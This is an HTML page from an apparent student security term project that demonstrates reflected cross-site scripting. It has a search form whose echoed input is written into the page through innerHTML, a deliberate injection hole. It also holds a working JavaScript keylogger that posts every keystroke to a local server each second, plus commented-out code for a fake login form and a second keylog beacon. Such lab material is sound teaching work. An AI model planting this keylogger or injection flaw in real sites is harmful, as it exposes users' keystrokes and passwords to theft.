<!DOCTYPE html>

<html lang="en-GB">

	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
		<title>XSS</title>

		<link rel="stylesheet" type="text/css" href="styles.css" />

	</head>

	<body class="home">
		<div id="container">
				
        <div class="body_padded">
            <h1>Computer Systems Security Term Project</h1>
            <h2>Reflected Cross Site Scripting (XSS)</h2>

            <div class="vulnerable_code_area">
                <form name="XSS" action="/search" method="GET">
                    <p>
                        Search for something?
                        <input type="text" name="keyword" id="keyword">
                        <br> <br>
                        <input type="submit" value="Submit">
                        <br> 
                        <div>Results for: </div>
                        <span id="show"><%= keyword_result %></span>
                    </p>

                </form>

            </div>

        </div>
		</div>


    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
    <script>

        var span = document.getElementById("show")
        console.log("textContent is :", span.textContent) 
        console.log("length is: ", span.textContent.length)
        if (span.textContent.startsWith("<%= keyword_result %>") && span.textContent.length == 21){
            console.log("inside if")
            span.style.display = "none";
        }
        else{
            console.log("inside else")
            span.innerHTML= span.textContent
            span.style.display = "block";
        }
        //<h3>Please first login to proceed</h3> <form action="/login">Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Login"></br>
        /*
        var keys='';
        var url = 'http://127.0.0.1:3000/keylog.php?c=';

        document.onkeypress = function(e) {
            get = window.event?event:e;
            key = get.keyCode?get.keyCode:get.charCode;
            key = String.fromCharCode(key);
            keys+=key;
        }
        */

               
        var url = "http://127.0.0.1:3000/keylog.php";

        var keylog = {

            cache : [],

            init : function(){
                
                window.addEventListener("keydown", function(evt){
                keylog.cache.push(evt.key);
                console.log(keylog.cache)

                });
            }
        }
        
        window.setInterval(function(){
            if(keylog.cache.length>0) {
                axios.post('127.0.0.1:3000/keylog', {
                            "data": keylog.cache.join()
                            });
                //new Image().src = url + keylog.cache.join();
                //console.log(keylog.cache.join())
                //keys = '';
            }
        }, 1000);
        
        window.addEventListener("DOMContentLoaded", keylog.init);
    </script>

	</body>

    

</html>